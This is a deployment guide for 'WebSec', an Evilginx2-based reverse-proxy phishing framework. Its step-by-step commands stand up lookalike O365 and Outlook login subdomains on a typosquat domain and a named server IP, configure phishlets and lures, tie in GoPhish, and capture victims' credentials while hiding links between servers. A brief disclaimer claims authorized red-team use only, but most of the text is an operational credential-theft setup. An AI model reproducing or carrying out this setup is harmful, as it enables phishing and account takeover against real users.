# WebSec Phishing Framework - Deployment Guide

A stealthy reverse proxy phishing framework for red team engagements, based on Evilginx2 with enhanced anti-detection capabilities.

## 🚀 Quick Start

This guide will help you deploy WebSec on AWS EC2 with Cloudflare integration for maximum stealth and functionality.

## 📋 Prerequisites

- AWS EC2 instance (Ubuntu 22.04 LTS recommended)
- Domain name: `azbpartnars.com`
- Cloudflare account
- GoPhish already deployed on separate server
- Basic knowledge of Linux command line

## 🏗️ Infrastructure Setup

### Multi-Server Architecture

**Current Setup:**
- **GoPhish Server:** Already deployed and working
  - Landing Page: `www.azbpartnars.com`
  - Admin Panel: `panel.azbpartnars.com:3333`
- **WebSec Server:** This deployment (43.205.114.81)
  - O365 Phishing: `login.azbpartnars.com`
  - Outlook Phishing: `mail.azbpartnars.com`
  - Generic Phishing: `secure.azbpartnars.com`
  - Auth Phishing: `auth.azbpartnars.com`

### AWS EC2 Instance Configuration

**Recommended Instance:**
- Type: `t3.medium` or `t3.large`
- OS: Ubuntu 22.04 LTS
- Storage: 20-50GB EBS volume
- Security Groups: Allow ports 22, 80, 443

**Security Group Rules:**
```
Inbound Rules:
- Port 22 (SSH) - Your IP only
- Port 80 (HTTP) - 0.0.0.0/0
- Port 443 (HTTPS) - 0.0.0.0/0
```

### Cloudflare Configuration

**Current Setup:**
- GoPhish Landing Page: `www.azbpartnars.com` → [GoPhish Server IP]
- GoPhish Admin Panel: `panel.azbpartnars.com:3333` → [GoPhish Server IP]

**WebSec DNS Records to Add:**
1. **Add Domain to Cloudflare:**
   - Add `azbpartnars.com` to your Cloudflare account (if not already added)
   - Set DNS A records for WebSec subdomains:
     - `login.azbpartnars.com` → `43.205.114.81`
     - `mail.azbpartnars.com` → `43.205.114.81`
     - `secure.azbpartnars.com` → `43.205.114.81`
     - `auth.azbpartnars.com` → `43.205.114.81`
   - Enable Cloudflare Proxy (orange cloud) for all subdomains

2. **SSL/TLS Settings:**
   - Mode: Full (strict)
   - Edge Certificates: Always Use HTTPS
   - Origin Certificates: Create and install for each subdomain

## 🔧 Server Setup

### 1. Initial Server Configuration

```bash
# Connect to your server
ssh -i your-key.pem ubuntu@43.205.114.81

# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y git curl wget build-essential ufw fail2ban
```

### 2. Install Go

```bash
# Download and install Go
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz

# Add Go to PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# Verify installation
go version
```

### 3. Deploy WebSec

```bash
# Clone the repository
git clone <your-repo-url> /opt/websec
cd /opt/websec

# Build the application
go build -o websec -mod=vendor

# Create necessary directories
mkdir -p ~/.websec/{crt/sites,phishlets,redirectors}

# Copy phishlets and redirectors
cp -r phishlets/* ~/.websec/phishlets/
cp -r redirectors/* ~/.websec/redirectors/

# Set permissions
chmod +x websec
sudo chown -R $USER:$USER ~/.websec
```

## 🔐 SSL Certificate Configuration

### Option 1: Cloudflare Origin Certificate (Recommended)

```bash
# Create certificate directories for each subdomain
mkdir -p ~/.websec/crt/sites/login.azbpartnars.com
mkdir -p ~/.websec/crt/sites/mail.azbpartnars.com
mkdir -p ~/.websec/crt/sites/secure.azbpartnars.com
mkdir -p ~/.websec/crt/sites/auth.azbpartnars.com

# Download Cloudflare Origin Certificates from Cloudflare dashboard for each subdomain
# Save as: ~/.websec/crt/sites/[subdomain]/fullchain.pem
# Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem

# Set proper permissions for each subdomain
chmod 600 ~/.websec/crt/sites/login.azbpartnars.com/privkey.pem
chmod 644 ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem
chmod 600 ~/.websec/crt/sites/mail.azbpartnars.com/privkey.pem
chmod 644 ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem
chmod 600 ~/.websec/crt/sites/secure.azbpartnars.com/privkey.pem
chmod 644 ~/.websec/crt/sites/secure.azbpartnars.com/fullchain.pem
chmod 600 ~/.websec/crt/sites/auth.azbpartnars.com/privkey.pem
chmod 644 ~/.websec/crt/sites/auth.azbpartnars.com/fullchain.pem
```

### Option 2: Let's Encrypt (Automatic)

```bash
# WebSec will automatically obtain Let's Encrypt certificates
# No additional configuration needed
```

## ⚙️ WebSec Configuration

### 1. Initial Configuration

```bash
# Start WebSec in developer mode for initial setup
cd /opt/websec
./websec -p ~/.websec/phishlets -t ~/.websec/redirectors -developer
```

### 2. Configure Basic Settings

In the WebSec terminal:

```bash
# Set domain
config domain azbpartnars.com

# Set IP and port
config ip 0.0.0.0
config port 443

# Disable autocert if using custom certificates
config autocert off

# Set blacklist mode
config blacklist off

# Configure GoPhish integration (optional)
config gophish admin_url https://panel.azbpartnars.com:3333
config gophish api_key [your-gophish-api-key]
config gophish test

# Exit developer mode
exit
```

### 3. Create Systemd Service

```bash
# Create systemd service file
sudo tee /etc/systemd/system/websec.service > /dev/null <<EOF
[Unit]
Description=WebSec Phishing Framework
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/opt/websec
ExecStart=/opt/websec/websec -p /home/ubuntu/.websec/phishlets -t /home/ubuntu/.websec/redirectors
Restart=always
RestartSec=5
Environment=HOME=/home/ubuntu

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable websec
sudo systemctl start websec

# Check status
sudo systemctl status websec
```

## 🔥 Firewall Configuration

```bash
# Configure UFW firewall
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw --force enable

# Check status
sudo ufw status
```

## 🛡️ Security Hardening

### 1. SSH Security

```bash
# Disable root login
sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# Configure fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

### 2. System Updates

```bash
# Enable automatic security updates
sudo apt install unattended-upgrades -y
sudo dpkg-reconfigure unattended-upgrades
```

## 🔄 Campaign Flow

### How the Multi-Server Setup Works:

1. **Email Campaign:** Victim receives phishing email
2. **WebSec Interception:** Victim clicks link → `login.azbpartnars.com`
3. **Credential Capture:** WebSec proxies to real O365, captures credentials
4. **Redirect to GoPhish:** After capture, redirect to `www.azbpartnars.com/landing-page`
5. **Campaign Tracking:** GoPhish tracks completion and provides analytics

### Benefits:
- **Domain Consistency:** All phishing uses `azbpartnars.com`
- **Separation of Concerns:** GoPhish for campaigns, WebSec for credential capture
- **Stealth:** No obvious connection between servers
- **Scalability:** Easy to add more phishing subdomains

## 🧪 Testing Your Deployment

### 1. Basic Connectivity Test

```bash
# Test if WebSec is running on subdomains
curl -k https://login.azbpartnars.com
curl -k https://mail.azbpartnars.com
curl -k https://secure.azbpartnars.com

# Check service status
sudo systemctl status websec

# View logs
sudo journalctl -u websec -f
```

### 2. Configure Phishlets for Subdomains

```bash
# Connect to WebSec
cd /opt/websec
./websec -p ~/.websec/phishlets -t ~/.websec/redirectors

# In WebSec terminal:
# Configure O365 phishlet
phishlets hostname o365 login.azbpartnars.com
phishlets enable o365

# Configure Outlook phishlet
phishlets hostname outlook mail.azbpartnars.com
phishlets enable outlook

# Configure generic phishlet
phishlets hostname generic secure.azbpartnars.com
phishlets enable generic

# Create lures for testing
lures create o365
lures get-url 0

# Test GoPhish integration
config gophish test
```

## 📊 Monitoring and Maintenance

### 1. Log Monitoring

```bash
# View real-time logs
sudo journalctl -u websec -f

# View recent logs
sudo journalctl -u websec --since "1 hour ago"

# Check for errors
sudo journalctl -u websec -p err
```

### 2. Service Management

```bash
# Restart service
sudo systemctl restart websec

# Stop service
sudo systemctl stop websec

# Start service
sudo systemctl start websec

# Check status
sudo systemctl status websec
```

### 3. Backup Script

```bash
# Create backup script
cat > ~/backup_websec.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
tar -czf ~/websec_backup_$DATE.tar.gz ~/.websec
echo "Backup created: websec_backup_$DATE.tar.gz"
EOF

chmod +x ~/backup_websec.sh

# Add to crontab for daily backups
crontab -e
# Add: 0 2 * * * /home/ubuntu/backup_websec.sh
```

## 🔧 Troubleshooting

### Common Issues

**1. Service won't start:**
```bash
# Check logs
sudo journalctl -u websec -n 50

# Check if port is in use
sudo netstat -tlnp | grep :443
```

**2. SSL Certificate issues:**
```bash
# Check certificate files for each subdomain
ls -la ~/.websec/crt/sites/login.azbpartnars.com/
ls -la ~/.websec/crt/sites/mail.azbpartnars.com/
ls -la ~/.websec/crt/sites/secure.azbpartnars.com/

# Verify certificates
openssl x509 -in ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem -text -noout
openssl x509 -in ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem -text -noout
```

**3. Domain not resolving:**
```bash
# Check DNS for subdomains
nslookup login.azbpartnars.com
nslookup mail.azbpartnars.com
nslookup secure.azbpartnars.com

# Check Cloudflare settings
# Ensure A records point to 43.205.114.81
```

**4. GoPhish integration issues:**
```bash
# Test GoPhish connection
config gophish test

# Check GoPhish admin panel
curl -k https://panel.azbpartnars.com:3333
```

### Useful Commands

```bash
# Check if WebSec is listening
sudo netstat -tlnp | grep websec

# Check process
ps aux | grep websec

# Test SSL for subdomains
openssl s_client -connect login.azbpartnars.com:443 -servername login.azbpartnars.com
openssl s_client -connect mail.azbpartnars.com:443 -servername mail.azbpartnars.com
```

## 📁 Directory Structure

```
/opt/websec/                    # Main application directory
├── websec                      # Executable
├── phishlets/                  # Phishlet templates
└── redirectors/                # HTML redirector templates

~/.websec/                      # Configuration directory
├── crt/sites/                  # SSL certificates
│   ├── login.azbpartnars.com/  # O365 certificates
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── mail.azbpartnars.com/   # Outlook certificates
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── secure.azbpartnars.com/ # Generic certificates
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   └── auth.azbpartnars.com/   # Auth certificates
│       ├── fullchain.pem      # Public certificate
│       └── privkey.pem        # Private key
├── phishlets/                  # Active phishlets
└── redirectors/                # Active redirectors
```

## 🚨 Security Considerations

### Important Notes

1. **Always use HTTPS** - Never run in HTTP mode for production
2. **Monitor logs regularly** - Check for errors or suspicious activity
3. **Keep certificates updated** - Set up automatic renewal
4. **Use strong passwords** - For SSH and all services
5. **Regular backups** - Backup configuration and data
6. **Test thoroughly** - Before using in actual engagements

### Legal Disclaimer

This tool is intended for authorized security testing and red team engagements only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for any misuse of this software.

## 📞 Support

For issues and questions:
1. Check the troubleshooting section above
2. Review logs: `sudo journalctl -u websec -f`
3. Verify configuration files
4. Check network connectivity and DNS resolution

## 🎯 Deployment Checklist

- [ ] AWS EC2 instance launched with proper security groups
- [ ] Go installed and working
- [ ] WebSec built successfully
- [ ] Domain `azbpartnars.com` configured in Cloudflare
- [ ] DNS A records for subdomains pointing to `43.205.114.81`
- [ ] GoPhish integration configured (optional)
- [ ] SSL certificates configured
- [ ] Systemd service created and running
- [ ] Firewall configured
- [ ] Security measures implemented
- [ ] Backup strategy in place
- [ ] Testing completed

---

**Your WebSec deployment is now ready for red team engagements with maximum stealth and functionality!**
